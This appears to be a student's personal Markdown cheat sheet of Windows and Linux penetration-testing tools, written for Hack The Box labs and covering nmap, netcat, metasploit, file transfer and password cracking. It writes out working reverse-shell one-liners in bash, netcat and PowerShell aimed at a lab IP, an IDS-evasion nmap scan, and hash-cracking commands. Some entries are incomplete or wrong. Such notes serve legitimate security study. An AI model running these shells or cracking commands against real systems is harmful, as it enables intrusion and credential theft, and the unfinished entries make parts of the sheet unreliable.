

# Windows tools
The section onward discusses only windows tools.

## getting OS version cmdlet
a cmdlet that can give you info on the OS version and more.
- 'Get-WmiObject -Class' using the 'win32_OperatingSystem' class.
## Other useful classes
- Win32_Process can give you a process listing.
- Win32_Service gives you a listing of services
- Win32_Bios gives you information about the BIOS of the computer.

More information about the CMDlet can be found here
- https://ss64.com/ps/get-wmiobject.html
- https://adamtheautomator.com/get-wmiobject/

## Navigating folders
dir tool lets you search folders.
- 'dir <folder>'

tree tool lets you show the path of a given folder. Also exists on linux but whateverrr.
- 'tree <folder>'
modified version of tree that lets you view folders one at a time instead of being bombarded by information.
- tree c:\ /f | more

## permission utils.
a utility for modifying and listing permissions of files and folders.
- 'icacls <folder>'
Resource access level is listed as follows
- (CI) container inherit
- (OI) object inherit
- (IO) inherit only
- (NP) Do not propogate inherit
- (I) Permission inherited from parent container



# Linux tools

how to connect to a VPN

- remember that if you're ever confused about a command, to use the "man" command.

## sudo openvpn user.ovpn
- user.ovpn represents the VPN key
- openvpn is the client

## ifconfig
- ifoncig gives you a list of network adapters. If you connect using the HTB VPN, it will probably give you a tun adapter.
- just the network layer of the connection

## netstat
- '-rn' flag shows you the networks available via the vpn.

## sudo
- the -u flag lets you specify a user in which you wish to sudo as.
- the -l flag lets you list every sudoer user.

## dpkg
- dpkg -l lists all packages installed on the system.

## SSH
- Use 'ssh user@host' to safely remotely access a computer. Very useful utility
- '-p' flag lets you specify a port in case for whatever reason port 22 is not used for ssh.
- '-i' lets you specify a private key file you can use to login. No password required, just the private key.

## Netcat
- 'nc <host> <port>' allows you to grab the banner of a given service running on a port. Also lets you set your ports to listening mode so it awaits incoming connections.
- 'nc -lvpn <port>' allows netcat to listen for a connection on a specific port.

- '-l' flag lets you set a port to listen mode
- '-p' flag lets you specify a port
- '-n' lets you disable dns resolution and only connect to IPs. This will speed up the connection
- '-v' enables verbose mode and will let netcat tell you when the port receives a signal

## FTP
- 'ftp -p <host>' ftp services can be connected to by using the ftp utility


## smbclient
Lets you enumerate shared SMB folders between users and admins
- 'smbclient <host>' lets you access it.
- '-L' flag lists available shares
- '-N' flag supresses password prompts.
- '-U' flag lets you submit a user as an extra parameter (will likely prompt you with a password)

## Get command
lets you download files from remotely accessed devices usually over ssh.
- 'get <file>'

## SNMP
- 'snmpwalk <version> <public/private> <ip>' lets you gather some information about a network management device.

## onesixtyone
Tool for bruteforcing community strings for networks.
- 'onesixtyone -c <dictionary> <ip>' lets you brute force community strings for networks.

## nmap
Tool for network scanning and enumeration (super useful)
- 'nmap <flags> <ip>'
- '-sC' parameter of nmap lets you specify which script should be used to gain more detailed information. By default it runs tons of scripts with the aim of identifying the service being ran on the port.
- '-sV' parameer instructs nmap to perform a version scan which lets nmap fingerprint the services on the traget system and identify their protocols, application names and version number. Version scan uses a massive databse of over 1000 service signatures, 
- '-p-' tells nmap that you want to scan EVERY single port out of all 65535 ports.
- '-oA'
- 'nmap -T0 -D [decoyIP1,decoyIP2,...,decoyIPn] --source-port 53 -f --data-length 16 -Pn <hostIP>'  attempts to evade IDS/IPS detection by using a really slow scan and spitting out a bunch of random red-herring data.
- '--open' flag only shows ports that are open ports.

Note: '-sV' and '-sC' parameters increase how long the scan takes because it has to perform a ton more checks instead of performing only a TCP handshake

## Gobuster
Tool for enumerating and brute forcing web pages of a given domain name or IP address.
- 'gobuster <dir/dns> <command options>'
- the dir flag lets you switch between directory enum mode and dns enum mode.
- 'dir -u' lets you specify a url that you want to connect to.
- 'dir -w' lets you specify a wordlist for a dictionary attack.
- Theres many more flags that you can lookup by looking at the 'man' page.

## EyeWitness
Eyewitness is a tool that lets you take screenshots of target web apps and also finger print them and identify credentials.
- lowk never had to use this tool (yet) so I dont really wanna write the note for this. Bite me :3

## starting up a python http server.
Http server is useful for moving files onto a remote host.
- 'python3 -m http.server <port>'
- files in the folder are automatically treated as pages and can be grabbed using wget.

## wget
Tool that lets you download webpages or content off of webpages.
- 'wget <url/ip>'
- if the remote server doesn't have wget, you should use curl.

## curl
Tool that lets you download stuff from certain ports or download a webpage.
- 'curl <ip/url>'
- '-I' flag lets you grab the header of an HTTP IMAP or SMTP protocol port.
- '-L' flag. In case the server redirects (as indicated per a 3xx code), this flag lets curl follow the redirect.
- '-O' flag lets you output the contents to a file.

## scp
SCP is a tool tat can let you download files over an ssh connection.
- 'scp <localfile> user@remotehost:/path/<localfile>'

## base64
In some cases, we may not be able to transfer files over the connection (IE remote host has a firewall) in which case we can encode the file using base64 and then paste and decode it on the server.
- 'base64 <file> -w 0'
- -w is a flag that lets you wrap the file after the COLS character. setting it to 0 disables wrapping.

## file tool
To validate the format of a file you can run the file command on it.
- 'file <file>'

## md5sum 
md5sum is a tool that lets you run a hashing function on a file. If the hashes match, then the filetransfer is correct. 
- 'md5sum <file>'

Note: md5sum is a very outdated for encrypting files because any skid with a potato pc who just discovered hydra/hashcat can crack it but still a reasonable hash function.

## sha256
another file validation hash function.
- 'sha256sum <file>'

## whatweb
a'whatweb <ip>'
- Lets you pinpoint the exact tech that runs on the webserver.
- Has a lot more functionality that lets you automate website enumeration across a network.

## Metasploit Primer
Tool that automates the usage of public exploits. Also has functionality involving enumeration and "checking" if a system is vulnerable instead of compromising the system.
- you can type 'search <exploit/module> <app>' to find an exploit
- you can also type 'use <pathtoexploit>' this lets you automatically apply the exploit.
- before you can run it you need to configure the options by typing 'show options'
- any option that's "required" is... well required for the exploit to work lol..
- the 'set <option> <input>' lets you set settings.
- 'exploit' lets you actually run the exploit
- The 'check' command lets you see if a server is vulnerable.
- 'Upload' command lets you upload something to the remote host (tbh Idk how this works atm)

## msfvenom
Tool for creating payloads for msfconsole to use. Can be a bind shell, reverse shell, web shell, or something completely differnt.
- 'msfconsole -p <payload_path>'
- -p flag lets you specify a payload.
- -l lists module types, payloads, encoders, nops, all etc.


## IP
Tool for viewing network interfaces.
- 'ip a' Lets you view your own IP.
- HTB uses 'tun0' as the default hackthebox vpn connection interface because they dont have internet access.
- Normally you'd use something like 'eth0' or something for a default IP.

## Reverse Shell Command
- The executed commands depend on what OS the compromised host runs on. A website called "Payload All The Things" has a comprehensive list of reverse shell commands which can be very useful.
A few standard commands are 
## Linux
- 'bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1''
Opens a TCP connection to the attacking host. 'bash -c <command>' takes command input from a string.
## Also bash
- 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f'
## Powershell
-  'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"'

I dont even know how to begin explaining this command. It looks obfuscated to me.

- We can use the exploit we have over a remote host to execute one of these commands. (IE through python or a metasploit module) to get a reverse connection

## xmllint
tool that lets you format xml files. 
- 'xmllint --format - <xml_file>' to format an xml file to be more readable

## cewl
cewl is a tool that lets you create custom wordlists with a file as input (can be an xml file or something like that.) Its essentially a small webcrawler/scraper.
- 'cewl <url> [flags...]'
- '-d <num>' flag lets you specify how many redirects deep the spider may crawl
- '-m <num>' flag lets you specify a minimum length of the words stored.
- '-w <filename>' lets you specify a filename to which to write the found words.
- '--lowercase' lets you store the words in lowercase.
Can be very useful for osint password cracking.

## upgrading tty
a command for upgrading tty of a reverse shell
- python -c 'import pty; pty.spawn("/bin/bash")'

## stty
Tool for modifying the configuration of the terminal. Can be used to upgrade the tty of a reverse shell.
- 'stty <options>'

## xfreerdp
an RDP client tool which can be used to remotely connect to a desktop
- 'xfreerdp /v:<targetIP> /u:<username> /p:<password>'

## John the Ripper commands
A tool for cracking passwords and hashes and such. See password cracking for details on the different modes of JTR.
- 'john --single <file>' runs john the ripper in single crack mode on the file.
- 'john --wordlist=<worlistFile> <hashFile>' runs JTR in wordlist mode.
- the '--rules' can be applied to generate candidate passwords by appending numbers, letters, capitalizing etc.
- 'john --incremental <hashFile>' runs JTR in increment mode.
- You can customize the configuration in incremental mode. Can be configured in john.conf.
- '--format' flag will list all available hash formats for jtr.
- 'locate *2john*' will list all available scripts that help you acquire hashes from files but these scripts are generally located in /usr/bin/script
- 'ssh2john.py SSH.private > <filename>' will help you extract the hash of an ssh key.

## Non-exhaustive list of most common JtR hash formats. Use --format to see an exhaustive list.
## afs
john  --format=afs [...] <hash_file> AFS (Andrew File System) password hashes
## bfegg
john  --format=bfegg [...] <hash_file> bfegg hashes used in Eggdrop IRC bots
## bf
john  --format=bf [...] <hash_file> Blowfish-based crypt(3) hashes
## bsdi
john  --format=bsdi [...] <hash_file> BSDi crypt(3) hashes
## crypt(3)
john  --format=crypt [...] <hash_file> Traditional Unix crypt(3) hashes
## des
john  --format=des [...] <hash_file> Traditional DES-based crypt(3) hashes
## dmd5
john  --format=dmd5 [...] <hash_file> DMD5 (Dragonfly BSD MD5) password hashes
## dominosec
john  --format=dominosec [...] <hash_file> IBM Lotus Domino 6/7 password hashes
## hmac-md5
john  --format=hmac-md5 [...] <hash_file> hmac-md5 password hashes
# sha1-gen
john  --format=sha1-gen [...] <hash_file> Generic SHA1 password hashes
## skey
john  --format=skey [...] <hash_file> S/Key (One-time password) hashes
## ssh
john  --format=ssh [...] <hash_file> SSH (Secure Shell) password hashes
## zip
john  --format=zip [...] <hash_file> ZIP (WinZip) password hashes

## Hashcat tool
another password cracking tool with really great GPU support.
- General syntax 'hashcat -a <attack_id> -m <hash_id> <hashes> [wordlist, rule, mask, ...]'
- '-a' is used to specify the attack mode
- '-m' is used to specify the hash type
- '<hashes>' is either a hash string or a hash file.
- '--help' will list a lot of the most common hash IDs used by hashcat.
- The main attack id's are dictionary attack (0), mask (3), association (XX) and combination (XX) --lol get the IDs of this when you land.

the following command lets you apply a rule to a wordlist and mutate it essentially.
- 'hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list'

## hashid tool
A tool for identifying the formats of hashes.
- 'hashid <flag> <hash>
- '-j' flag will list the corresponding John the Ripper format for the hash.
- '-m' flag will list the corresponding hashcat hash type.
- '-r <ruleset> flag lets you specify a ruleset to use for hashcat.

## A command for finding file extensions of encrypted files.
Literally just a for loop
- 'for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done'

## Grep
A tool for searching for text in files.
- 'grep <text>' literally lets you just see if the given string pops up in the file.
- '-r' flag lets you recursively search listed subdirectory.
- '-n' each output line is preceded by its relative line number in the file. (It is reset for each file).
- '-E' lets you input regex expressions as part of the string.

## ssh-keygen
A tool used for generating ssh keys. Also has added functionality that lets you read ssh keys from keyfiles.
- 'ssh-keygen <flags/options>
- '-y' flag lets you input a private keyfile and output it's corresponding public key.
- '-f' flag lets you specify the name of a given keyfile. Often used as '-yf'

Note: Has a lot more functionality than just this note. I recommend reading the man page. Youll also learn a bit about ssh configuration probably.

## Command for extracting the hash out of a password-protected .zip file.
- 'zip2john FILE.zip > FILE.hash'
Then we can just crack it with JTR.
'john --wordlist=<wordlist> FILE.hash'
## Command for extracting the hash out of a bitlocker drive.
- 'bitlocker2john -i /path/to/drive'

## Command for determining the format of a file.
- To determine the format of a file, you can use the 'file <FILE>' command

## Command for setting up a loopback device
- 'losetup ???' # finish later

